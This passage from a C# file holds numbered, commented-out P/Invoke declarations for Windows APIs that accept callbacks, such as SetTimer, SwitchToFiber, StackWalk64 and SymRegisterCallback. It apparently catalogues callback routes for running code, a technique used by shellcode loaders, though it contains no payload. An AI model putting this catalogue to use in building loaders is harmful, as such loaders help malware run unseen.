            FILE_READ_ATTRIBUTES = 0x0080,      // all
            FILE_WRITE_ATTRIBUTES = 0x0100,     // all

            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,

            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
            FILE_ALL_ACCESS = StandardRightsRequired | Synchronize | 0x1FF,
            FILE_GENERIC_READ = StandardRightsRead | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | Synchronize,
            FILE_GENERIC_WRITE = StandardRightsWrite | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | Synchronize,
            FILE_GENERIC_EXECUTE = StandardRightsExecute | FILE_READ_ATTRIBUTES | FILE_EXECUTE | Synchronize
        }

        const int FILE_SHARE_READ = 1;
        const int CREATE_NEW = 1;
        const int CREATE_ALWAYS = 2;
        const int OPEN_EXISTING = 3;
        const uint GENERIC_READ = (0x80000000);
        const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
        const short FILE_ATTRIBUTE_NORMAL = 0x80;
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
             string filename,
             uint access,
             int share,
             IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
             int creationDisposition,
             short flagsAndAttributes,
             IntPtr templateFile
        );

        [DllImport("kernel32.dll")]
        static extern bool ReadFileEx(
            IntPtr hFile,
            [Out] byte[] lpBuffer,
            uint nNumberOfBytesToRead,
            [In] ref System.Threading.NativeOverlapped lpOverlapped,
            IntPtr lpCompletionRoutine
        );

        [DllImport("kernel32.dll")]
        static extern int SleepEx(
             UInt32 dwMilliseconds,
             bool bAlertable
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(
           IntPtr hObject
        );
        */

        //[58]
        //RegisterApplicationRecoveryCallback
        /*
        [DllImport("kernel32.dll")]
        static extern uint RegisterApplicationRecoveryCallback(
            IntPtr pRecoveryCallback,
            IntPtr pvParameter,
            int dwPingInterval,
            int dwFlags
        );

        [DllImport("kernel32.dll")]
        public static extern uint UnregisterApplicationRecoveryCallback();
        */

        //[59]
        //RegisterWaitChainCOMCallback
        /*
        [DllImport("Advapi32.dll")]
        public extern static void RegisterWaitChainCOMCallback(
            IntPtr CallStateCallback,
            IntPtr ActivationStateCallback
        );
        */

        //[5A]
        //RegisterWaitForSingleObject
        /*
        [Flags]
        enum EFileAccess : uint
        {
            AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
            MaximumAllowed = 0x2000000,     // MaximumAllowed access type

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,        // file & pipe
            FILE_LIST_DIRECTORY = 0x0001,       // directory
            FILE_WRITE_DATA = 0x0002,       // file & pipe
            FILE_ADD_FILE = 0x0002,         // directory
            FILE_APPEND_DATA = 0x0004,      // file
            FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
            FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
            FILE_READ_EA = 0x0008,          // file & directory
            FILE_WRITE_EA = 0x0010,         // file & directory
            FILE_EXECUTE = 0x0020,          // file
            FILE_TRAVERSE = 0x0020,         // directory
            FILE_DELETE_CHILD = 0x0040,     // directory
            FILE_READ_ATTRIBUTES = 0x0080,      // all
            FILE_WRITE_ATTRIBUTES = 0x0100,     // all

            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,

            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
            FILE_ALL_ACCESS = StandardRightsRequired | Synchronize | 0x1FF,
            FILE_GENERIC_READ = StandardRightsRead | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | Synchronize,
            FILE_GENERIC_WRITE = StandardRightsWrite | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | Synchronize,
            FILE_GENERIC_EXECUTE = StandardRightsExecute | FILE_READ_ATTRIBUTES | FILE_EXECUTE | Synchronize
        }

        const int FILE_SHARE_READ = 1;
        const int OPEN_EXISTING = 3;
        const short FILE_ATTRIBUTE_NORMAL = 0x80;
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFileW(
            string filename,
            uint access,
            int share,
            IntPtr securityAttributes,
            int creationDisposition,
            short flagsAndAttributes,
            IntPtr templateFile
        );

        [DllImport("Kernel32.dll")]
        static extern IntPtr RegisterWaitForSingleObject(
            out IntPtr phNewWaitObject,
            IntPtr hObject,
            IntPtr Callback,
            IntPtr Context,
            ulong dwMilliseconds,
            ulong dwFlags
        );
        */

        //[5B]
        //ReplaceText
        /*
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct FINDREPLACE
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public uint Flags;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrFindWhat;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrReplaceWith;
            public ushort wFindWhatLen;
            public ushort wReplaceWithLen;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public IntPtr lpTemplateName;
        }

        [DllImport("comdlg32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr ReplaceText(
            ref FINDREPLACE lpfr
        );

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        */

        //[5C]
        //RoInspectCapturedStackBackTrace
        /*
        [DllImport("combase.dll", ExactSpelling = true)]
        public static extern IntPtr RoInspectCapturedStackBackTrace(
            IntPtr targetErrorInfoAddress,
            ushort machine,
            IntPtr readMemoryCallback,
            int context,
            UInt64 frameCount,
            UIntPtr targetBackTraceAddress
        );
        */

        //[5D]
        //RoInspectThreadErrorInfo
        /*
        [DllImport("combase.dll", ExactSpelling = true)]
        public static extern IntPtr RoInspectThreadErrorInfo(
            UIntPtr targetTebAddress,
            ushort machine,
            IntPtr readMemoryCallback,
            int context,
            UIntPtr targetErrorInfoAddress
        );
        */

        //[5E]
        //SendMessageCallback
        //SendMessageCallbackA
        //SendMessageCallbackW
        /*
        [StructLayout(LayoutKind.Sequential)]
        public struct MSG
        {
            IntPtr hwnd;
            uint message;
            UIntPtr wParam;
            IntPtr lParam;
            int time;
            IntPtr pt;
            int lPrivate;
        }

        public static readonly IntPtr HWND_BROADCAST = new IntPtr(0xffff);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool SendMessageCallback(
            IntPtr hWnd,
            uint Msg,
            UIntPtr wParam,
            IntPtr lParam,
            IntPtr lpCallBack,
            UIntPtr dwData
        );

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool SendMessageCallbackA(
            IntPtr hWnd,
            uint Msg,
            UIntPtr wParam,
            IntPtr lParam,
            IntPtr lpCallBack,
            UIntPtr dwData
        );

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool SendMessageCallbackW(
            IntPtr hWnd,
            uint Msg,
            UIntPtr wParam,
            IntPtr lParam,
            IntPtr lpCallBack,
            UIntPtr dwData
        );

        [DllImport("user32.dll")]
        public static extern int GetMessage(
            out MSG lpMsg,
            IntPtr hWnd,
            uint wMsgFilterMin,
            uint wMsgFilterMax
        );

        [DllImport("user32.dll")]
        public static extern IntPtr DispatchMessage(
            [In] ref MSG lpmsg
        );
        */

        //[5F]
        //SetTimer
        /*
        [StructLayout(LayoutKind.Sequential)]
        public struct MSG
        {
            IntPtr hwnd;
            uint message;
            UIntPtr wParam;
            IntPtr lParam;
            int time;
            IntPtr pt;
            int lPrivate;
        }

        [DllImport("user32.dll", ExactSpelling = true)]
        public static extern IntPtr SetTimer(
            IntPtr hWnd,
            IntPtr nIDEvent,
            uint uElapse,
            IntPtr lpTimerFunc
        );
        [DllImport("user32.dll")]
        public static extern int GetMessage(
            out MSG lpMsg,
            IntPtr hWnd,
            uint wMsgFilterMin,
            uint wMsgFilterMax
        );

        [DllImport("user32.dll")]
        public static extern IntPtr DispatchMessage(
            [In] ref MSG lpmsg
        );
        */

        //[60]
        //SetupCommitFileQueue
        //SetupCommitFileQueueA
        //SetupCommitFileQueueW
        /*
        [DllImport("Setupapi.dll")]
        static extern IntPtr SetupOpenFileQueue();

        [DllImport("Setupapi.dll")]
        public static extern bool SetupQueueCopyW(
            IntPtr QueueHandle,
            string SourceRootPath,
            string SourcePath,
            string SourceFilename,
            string SourceDescription,
            string SourceTagfile,
            string TargetDirectory,
            string TargetFilename,
            uint CopyStyle
        );

        [DllImport("Setupapi.dll")]
        static extern bool SetupCommitFileQueueW(
            IntPtr Owner,
            IntPtr QueueHandle,
            IntPtr MsgHandler,
            IntPtr Context
        );

        [DllImport("user32.dll")]
        static extern IntPtr GetTopWindow(
            IntPtr hWnd
        );
        */

        //[61]
        //SetupInstallFile
        /*
        [Flags]
        enum EFileAccess : uint
        {
            AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
            MaximumAllowed = 0x2000000,     // MaximumAllowed access type

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,        // file & pipe
            FILE_LIST_DIRECTORY = 0x0001,       // directory
            FILE_WRITE_DATA = 0x0002,       // file & pipe
            FILE_ADD_FILE = 0x0002,         // directory
            FILE_APPEND_DATA = 0x0004,      // file
            FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
            FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
            FILE_READ_EA = 0x0008,          // file & directory
            FILE_WRITE_EA = 0x0010,         // file & directory
            FILE_EXECUTE = 0x0020,          // file
            FILE_TRAVERSE = 0x0020,         // directory
            FILE_DELETE_CHILD = 0x0040,     // directory
            FILE_READ_ATTRIBUTES = 0x0080,      // all
            FILE_WRITE_ATTRIBUTES = 0x0100,     // all

            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,

            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
            FILE_ALL_ACCESS = StandardRightsRequired | Synchronize | 0x1FF,
            FILE_GENERIC_READ = StandardRightsRead | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | Synchronize,
            FILE_GENERIC_WRITE = StandardRightsWrite | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | Synchronize,
            FILE_GENERIC_EXECUTE = StandardRightsExecute | FILE_READ_ATTRIBUTES | FILE_EXECUTE | Synchronize
        }

        const int FILE_SHARE_READ = 1;
        const int CREATE_NEW = 1;
        const int CREATE_ALWAYS = 2;
        const int OPEN_EXISTING = 3;
        const short FILE_ATTRIBUTE_NORMAL = 0x80;
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        const uint SP_COPY_DELETESOURCE = 0x0000001; // delete source file on successful copy
        const uint SP_COPY_REPLACEONLY = 0x0000002; // copy only if target file already present
        const uint SP_COPY_NEWER_OR_SAME = 0x0000004; // copy only if source newer than or same as target
        const uint SP_COPY_NEWER_ONLY = 0x0010000; // copy only if source file newer than target
        const uint SP_COPY_NOOVERWRITE = 0x0000008; // copy only if target doesn't exist
        const uint SP_COPY_NODECOMP = 0x0000010; // don't decompress source file while copying
        const uint SP_COPY_LANGUAGEAWARE = 0x0000020; // don't overwrite file of different language
        const uint SP_COPY_SOURCE_ABSOLUTE = 0x0000040; // SourceFile is a full source path
        const uint SP_COPY_SOURCEPATH_ABSOLUTE = 0x0000080; // SourcePathRoot is the full path
        const uint SP_COPY_FORCE_IN_USE = 0x0000200; // Force target- in-use behavior
        const uint SP_COPY_FORCE_NOOVERWRITE = 0x0001000; // like NOOVERWRITE but no callback nofitication
        const uint SP_COPY_FORCE_NEWER = 0x0002000; // like NEWER but no callback nofitication

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
            string filename,
            uint access,
            int share,
            IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
            int creationDisposition,
            short flagsAndAttributes,
            IntPtr templateFile
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr CreateFileA(
            string filename,
            uint access,
            int share,
            IntPtr securityAttributes,
            int creationDisposition,
            short flagsAndAttributes,
            IntPtr templateFile
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFileW(
            string filename,
            uint access,
            int share,
            IntPtr securityAttributes,
            int creationDisposition,
            short flagsAndAttributes,
            IntPtr templateFile
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteFile(
            IntPtr handle,
            byte[] buffer,
            int count,
            ref uint written,
            IntPtr lpOverlapped
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(
             IntPtr hObject
         );

        [DllImport("setupapi.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool SetupInstallFile(
            IntPtr InfHandle,
            IntPtr InfContext,
            string SourceFile,
            string SourcePathRoot,
            string DestinationName,
            uint CopyStyle,
            IntPtr CopyMsgHandler,
            IntPtr Context
        );
        */

        //[62]
        //SetupIterateCabinet
        /*
        [DllImport("SetupApi.dll", CharSet = CharSet.Auto)]
        public static extern bool SetupIterateCabinet(
            string cabinetFile,
            uint reserved,
            IntPtr callBack,
            uint context
        );
        */

        //[63]
        //SetWaitableTimer
        /*
        [StructLayout(LayoutKind.Explicit, Size = 8)]
        struct LARGE_INTEGER
        {
            [FieldOffset(0)] public Int64 QuadPart;
            [FieldOffset(0)] public UInt32 LowPart;
            [FieldOffset(4)] public Int32 HighPart;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateWaitableTimer(
            IntPtr lpTimerAttributes,
            bool bManualReset,
            string lpTimerName
        );

        [DllImport("kernel32.dll")]
        static extern bool SetWaitableTimer(
            IntPtr hTimer,
            ref LARGE_INTEGER pDueTime,
            int lPeriod,
            IntPtr pfnCompletionRoutine,
            IntPtr lpArgToCompletionRoutine,
            bool fResume
        );

        [DllImport("kernel32.dll")]
        static extern int SleepEx(
             UInt32 dwMilliseconds,
             bool bAlertable
        );
        */

        //[64]
        //SHBrowseForFolder
        /*
        [StructLayout(LayoutKind.Sequential)]
        struct BROWSEINFO
        {
            public IntPtr hwndOwner;
            public IntPtr pidlRoot;
            public IntPtr pszDisplayName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpszTitle;
            public uint ulFlags;
            public IntPtr lpfn;
            public IntPtr lParam;
            public int iImage;
        }

        [DllImport("shell32.dll")]
        static extern IntPtr SHBrowseForFolder(
            ref BROWSEINFO lpbi
        );
        */

        //[65]
        //SHCreateThread
        /*
        [DllImport("shlwapi", ExactSpelling = true)]
        public static extern bool SHCreateThread(
            IntPtr pfnThreadProc,
            uint pData,
            uint flags,
            IntPtr pfnCallback
        );
        */

        //[66]
        //SHCreateThreadWithHandle
        /*
        [DllImport("Shlwapi.dll")]
        static extern bool SHCreateThreadWithHandle(
           IntPtr pfnThreadProc,
           IntPtr pData,
           uint flags,
           IntPtr pfnCallback,
           ref IntPtr hThread);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(
            IntPtr Handle,
            uint Wait
        );

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(
            IntPtr hObject
        );
        */

        //[67]
        //StackWalk
        //StackWalk64
        /*
        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }
        public struct STACKFRAME
        {
            public IntPtr AddrPC;
            public IntPtr AddrReturn;
            public IntPtr AddrFrame;
            public IntPtr AddrStack;
            public IntPtr FuncTableEntry;
            public uint Params;
            public bool Far;
            public bool Virtual;
            public uint Reserved;
            public IntPtr KDHELP64;
            public IntPtr AddrBStore;
        }

        public enum MachineType : ushort
        {
            IMAGE_FILE_MACHINE_UNKNOWN = 0x0,
            IMAGE_FILE_MACHINE_AM33 = 0x1d3,
            IMAGE_FILE_MACHINE_AMD64 = 0x8664,
            IMAGE_FILE_MACHINE_ARM = 0x1c0,
            IMAGE_FILE_MACHINE_EBC = 0xebc,
            IMAGE_FILE_MACHINE_I386 = 0x14c,
            IMAGE_FILE_MACHINE_IA64 = 0x200,
            IMAGE_FILE_MACHINE_M32R = 0x9041,
            IMAGE_FILE_MACHINE_MIPS16 = 0x266,
            IMAGE_FILE_MACHINE_MIPSFPU = 0x366,
            IMAGE_FILE_MACHINE_MIPSFPU16 = 0x466,
            IMAGE_FILE_MACHINE_POWERPC = 0x1f0,
            IMAGE_FILE_MACHINE_POWERPCFP = 0x1f1,
            IMAGE_FILE_MACHINE_R4000 = 0x166,
            IMAGE_FILE_MACHINE_SH3 = 0x1a2,
            IMAGE_FILE_MACHINE_SH3DSP = 0x1a3,
            IMAGE_FILE_MACHINE_SH4 = 0x1a6,
            IMAGE_FILE_MACHINE_SH5 = 0x1a8,
            IMAGE_FILE_MACHINE_THUMB = 0x1c2,
            IMAGE_FILE_MACHINE_WCEMIPSV2 = 0x169,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ADDRESS64
        {
            public ulong Offset;
            public ushort Segment;
            public ADDRESS_MODE Mode;
        }
        public enum ADDRESS_MODE
        {
            AddrMode1616,
            AddrMode1632,
            AddrModeReal,
            AddrModeFlat
        }
        public struct KDHELP64
        {
            public ulong Thread;
            public uint ThCallbackStack;
            public uint ThCallbackBStore;
            public uint NextCallback;
            public uint FramePointer;
            public ulong KiCallUserMode;
            public ulong KeUserCallbackDispatcher;
            public ulong SystemRangeStart;
            public ulong KiUserExceptionDispatcher;
            public ulong StackBase;
            public ulong StackLimit;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 5)]
            public ulong[] Reserved;
        }
        public struct STACKFRAME64
        {
            public ADDRESS64 AddrPC;
            public ADDRESS64 AddrReturn;
            public ADDRESS64 AddrFrame;
            public ADDRESS64 AddrStack;
            public ADDRESS64 AddrBStore;
            public IntPtr FuncTableEntry;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ulong[] Params;
            public bool Far;
            public bool Virtual;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
            public ulong[] Reserved;
            public KDHELP64 KdHelp;
        }

        [DllImport("DbgHelp.dll")]
        static extern bool StackWalk(
            MachineType MachineType,
            IntPtr hProcess,
            IntPtr hThread,
            ref STACKFRAME StackFrame,
            ref CONTEXT64 ContextRecord,
            IntPtr ReadMemoryRoutine,
            IntPtr FunctionTableAccessRoutine,
            IntPtr GetModuleBaseRoutine,
            IntPtr TranslateAddress
         );

        [DllImport("Dbghelp.dll")]
        public static extern bool StackWalk64(
            MachineType machineType,
            IntPtr hProcess,
            IntPtr hThread,
            ref STACKFRAME64 stackFrame,
            ref CONTEXT contextRecord,
            IntPtr readMemoryRoutine,
            IntPtr functionTableAccessRoutine,
            IntPtr getModuleBaseRoutine,
            IntPtr translateAddress
         );
        */

        //[68]
        //SwitchToFiber
        /*
        [DllImport("kernel32.dll")]
        static extern IntPtr ConvertThreadToFiber(
            IntPtr lpParameter
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateFiber(
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter
        );

        [DllImport("kernel32.dll")]
        public static extern IntPtr SwitchToFiber(
            IntPtr lpParameter
        );
        */

        //[69]
        //SymEnumProcesses
        /*
        [DllImport("Dbghelp.dll")]
        private static extern bool SymInitialize(
            IntPtr hProcess,
            string UserSearchPath,
            bool fInvadeProcess
        );

        [DllImport("Dbghelp.dll")]
        private static extern bool SymEnumProcesses(
            IntPtr EnumProcessesCallback,
            IntPtr UserContext
        );
        */

        //[6A]
        //SymFindFileInPath
        /*
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct SYMSRV_INDEX_INFO
        {
            public const int MAX_PATH = 260;

            [MarshalAs(UnmanagedType.U4)]
            public Int32 sizeofstruct;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH + 1)]
            public string file;

            [MarshalAs(UnmanagedType.Bool)]
            public bool stripped;

            [MarshalAs(UnmanagedType.U4)]
            public uint timestamp;

            [MarshalAs(UnmanagedType.U4)]
            public uint size;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH + 1)]
            public string dbgfile;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH + 1)]
            public string pdbfile;

            [MarshalAs(UnmanagedType.Struct)]
            public Guid guid;

            [MarshalAs(UnmanagedType.U4)]
            public int sig;

            [MarshalAs(UnmanagedType.U4)]
            public int age;
        }

        public const int SSRVOPT_DWORD = 0x0002;
        public const int SSRVOPT_DWORDPTR = 0x0004;
        public const int SSRVOPT_GUIDPTR = 0x0008;

        [DllImport("Dbghelp.dll")]
        public static extern bool SymInitialize(
            IntPtr hProcess,
            string UserSearchPath,
            bool fInvadeProcess
        );

        [DllImport("dbghelp.dll", SetLastError = false, CharSet = CharSet.Unicode)] // SetLastError=true, but if we set it to false we don"t have to catch exceptions
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SymSrvGetFileIndexInfo(
            string file,
            ref SYMSRV_INDEX_INFO info,
            [MarshalAs(UnmanagedType.U4)] int flags
        );

        [DllImport("dbghelp.dll", SetLastError = true)]
		static extern bool SymFindFileInPath(
            IntPtr hProcess,
            String searchPath,
            String filename,
            uint id,
            uint two,
            uint three,
            uint flags,
            StringBuilder filePath,
            IntPtr callback,
            IntPtr context
        );
        */

        //[6B]
        //SymRegisterCallback
        /*
        [DllImport("DbgHelp.dll")]
        static extern bool SymInitialize(
            IntPtr hProcess,
            string UserSearchPath,
            bool fInvadeProcess
        );

        [DllImport("DbgHelp.dll")]
        static extern bool SymRegisterCallback(
            IntPtr hProcess,
            IntPtr hCallback,
            IntPtr UserContext
        );

        [DllImport("DbgHelp.dll")]
        static extern bool SymRefreshModuleList(
            IntPtr hProcess
        );
        */

        //[6C]
        //TrySubmitThreadpoolCallback
        /*
        [DllImport("kernel32.dll")]
        static extern bool TrySubmitThreadpoolCallback(
            IntPtr pfns,
            IntPtr pv,
            IntPtr pcbe
        );
        */

        //[6D]
        //VerifierEnumResource
        /*
        [DllImport("Verifier.dll")]
        private static extern string VerifierEnumerateResource(
            IntPtr hModule,
            UInt64 resourceType,
            UInt64 ResourceType,
            IntPtr ResourceCallback,
            IntPtr EnumerationContext
        );
        */

        //[6E]
        //WindowsInspectString
        /*
        [DllImport("ComBase.dll")]
        static extern long WindowsInspectString(
            string targetHString,
            ushort machine,
            IntPtr callback,
            IntPtr context,
            ref uint length,
            ref IntPtr targetStringAddress
        );
        */

        //[6F]
        //WinHttpSetStatusCallback
        /*
        [DllImport("winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpOpen(
            string pszAgent,
            uint dwAccessType,
            string pszProxyW,
            string pszProxyBypass,
            uint dwFlags
        );

        [DllImport("winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpSetStatusCallback(
            IntPtr hInternet,
            IntPtr lpfnInternetCallback,
            uint dwNotificationFlags,
            IntPtr dwReserved
        );

        [DllImport("winhttp.dll", SetLastError = true)]
        static extern IntPtr WinHttpConnect(IntPtr hSession,
            string pswzServerName,
            short nServerPort,
            int dwReserved
        );
        */

        //[70]
        //WriteEncryptedFileRaw
        /*
        [DllImport("Advapi32.dll")]
        static extern uint OpenEncryptedFileRaw(
            string lpFilename,
            ulong ulFlags,
            out IntPtr pvContext
        );

        [DllImport("Advapi32.dll")]
        static extern uint WriteEncryptedFileRaw(
            IntPtr pfImportCallback,
            IntPtr pvCallbackContext,
            IntPtr pvContext
        );
        */

        //[71]
        //WriteFileEx
        /*
        [Flags]
        enum EFileAccess : uint
        {
            AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
            MaximumAllowed = 0x2000000,     // MaximumAllowed access type

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
